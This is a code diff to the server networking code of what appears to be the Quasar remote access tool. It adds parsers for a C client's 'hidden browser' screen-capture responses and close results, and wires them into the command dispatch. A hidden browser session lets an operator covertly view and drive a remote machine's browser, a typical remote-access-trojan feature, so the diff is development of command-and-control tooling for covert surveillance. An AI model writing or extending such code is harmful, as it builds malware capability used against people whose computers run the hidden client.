@@ -501,12 +501,12 @@ namespace Quasar.Server.Networking
         }
 
         /* Fallback: C client GetDesktopResponse = 08 2C (subtype 44) + field 1 Image (0x0A bytes) + field 2 Quality (0x10 varint) + field 3 Monitor (0x18 varint) + field 4 Resolution (0x22 len msg). */
-        private static bool TryParseRawGetDesktopResponse(byte[] payload, int start, int length, out GetDesktopResponse result)
+        private static bool TryParseRawGetDesktopResponse(byte[] payload, int start, int length, out GetDesktopResponse result, int? requiredSubtype = 44)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 44) return false;
+            if (subtype != (requiredSubtype ?? 44)) return false;
             byte[] image = null;
             int quality = 75, monitor = 0;
             Resolution resolution = null;
@@ -552,6 +552,21 @@ namespace Quasar.Server.Networking
             }
             if (image == null) return false;
             result = new GetDesktopResponse { Image = image, Quality = quality, Monitor = monitor, Resolution = resolution ?? new Resolution() };
+            return true;
+        }
+
+        /* Fallback: C client GetHiddenBrowserResponse (subtype 127) - same body format as GetDesktopResponse. */
+        private static bool TryParseRawGetHiddenBrowserResponse(byte[] payload, int start, int length, out GetHiddenBrowserResponse result)
+        {
+            result = null;
+            if (!TryParseRawGetDesktopResponse(payload, start, length, out var deskResp, 127)) return false;
+            result = new GetHiddenBrowserResponse
+            {
+                Image = deskResp.Image,
+                Quality = deskResp.Quality,
+                Monitor = deskResp.Monitor,
+                Resolution = deskResp.Resolution
+            };
             return true;
         }
 
@@ -695,6 +710,35 @@ namespace Quasar.Server.Networking
                 offset += len;
             }
             result = new KernelInputInitResponse { Success = success, ErrorMessage = errorMessage ?? "" };
+            return true;
+        }
+
+        /* Fallback: C client CloseHiddenBrowserResult (subtype 128) = 08 80 01 + field 1 Result (varint: 0=failed, 1=success, 2=no window), 2 Message (string). */
+        private static bool TryParseRawCloseHiddenBrowserResult(byte[] payload, int start, int length, out CloseHiddenBrowserResult result)
+        {
+            result = null;
+            int end = start + length;
+            if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
+            if (subtype != 128) return false;
+            int res = 0;
+            string message = "";
+            while (offset < end)
+            {
+                if (!TryReadVarint(payload, ref offset, end, out int tag)) break;
+                int field = tag >> 3;
+                int wire = tag & 7;
+                if (wire == 0)
+                {
+                    if (!TryReadVarint(payload, ref offset, end, out int v)) break;
+                    if (field == 1) res = v;
+                    continue;
+                }
+                if (wire != 2) break;
+                if (!TryReadVarint(payload, ref offset, end, out int len) || offset + len > end) break;
+                if (field == 2) message = Encoding.UTF8.GetString(payload, offset, len);
+                offset += len;
+            }
+            result = new CloseHiddenBrowserResult { Result = res, Message = message ?? "" };
             return true;
         }
 
@@ -1082,6 +1126,10 @@ namespace Quasar.Server.Networking
                                         {
                                             message = rawStartup;
                                         }
+                                        else if (TryParseRawGetHiddenBrowserResponse(_payloadBuffer, payloadStart, _payloadLen, out var rawHiddenBrowser))
+                                        {
+                                            message = rawHiddenBrowser;
+                                        }
                                         else if (TryParseRawGetDesktopResponse(_payloadBuffer, payloadStart, _payloadLen, out var rawDesktop))
                                         {
                                             message = rawDesktop;
@@ -1101,6 +1149,10 @@ namespace Quasar.Server.Networking
                                         else if (TryParseRawKernelInputInitResponse(_payloadBuffer, payloadStart, _payloadLen, out var rawKernelInit))
                                         {
                                             message = rawKernelInit;
+                                        }
+                                        else if (TryParseRawCloseHiddenBrowserResult(_payloadBuffer, payloadStart, _payloadLen, out var rawCloseGhost))
+                                        {
+                                            message = rawCloseGhost;
                                         }
                                         else
                                         {
